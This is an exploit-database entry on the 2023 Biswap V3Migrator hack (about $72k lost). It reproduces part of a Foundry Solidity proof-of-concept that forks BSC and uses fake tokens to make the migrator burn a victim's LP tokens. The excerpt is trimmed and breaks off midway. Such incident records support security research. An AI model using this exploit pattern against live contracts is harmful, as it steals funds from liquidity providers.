# [?] Biswap - V3Migrator Exploit

## Summary
Severity: Unknown
Chain: EVM
Component: Biswap
Published: 2023-06-30
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/Biswap_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$72k

```solidity
contract ContractTest is Test {
    function setUp() public {
        // fork bsc
        uint256 forkId = vm.createFork("bsc", 29_554_461);
        vm.selectFork(forkId);
    }

    function testExploit() public {
        V3Migrator migrator = V3Migrator(0x839b0AFD0a0528ea184448E890cbaAFFD99C1dbf);
        IUniswapV2Pair pairToMigrate = IUniswapV2Pair(0x63b30de1A998e9E64FD58A21F68D323B9BcD8F85);
        address victimAddress = 0x2978D920a1655abAA315BAd5Baf48A2d89792618;

        IBiswapFactoryV3 biswapV3 = IBiswapFactoryV3(0x7C3d53606f9c03e7f54abdDFFc3868E1C5466863);
        //0. Preparations: create pool for fake tokens and transfer fake tokens to the migrator
        FakeToken fakeToken0 = new FakeToken();
        FakeToken fakeToken1 = new FakeToken();
        FakePair fakePair = new FakePair();
        biswapV3.newPool(address(fakeToken1), address(fakeToken0), 150, 1);
        fakeToken0.transfer(address(migrator), 1e9 * 1e18);
        fakeToken1.transfer(address(migrator), 1e9 * 1e18);

        uint256 liquidityValue = pairToMigrate.balanceOf(victimAddress);
        emit log_named_uint("liquidity to migrate", liquidityValue);
        IERC20 token0 = IERC20(pairToMigrate.token0());
        IERC20 token1 = IERC20(pairToMigrate.token1());
        assert(token0.balanceOf(address(this)) == 0);

        //1. Burn victim's LP token and add liquidity with fake tokens
        V3Migrator.MigrateParams memory params = V3Migrator.MigrateParams(
            address(pairToMigrate),
            liquidityValue,
            address(fakeToken1),
            address(fakeToken0),
            150,
            10_000,
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/Biswap_exp.sol_
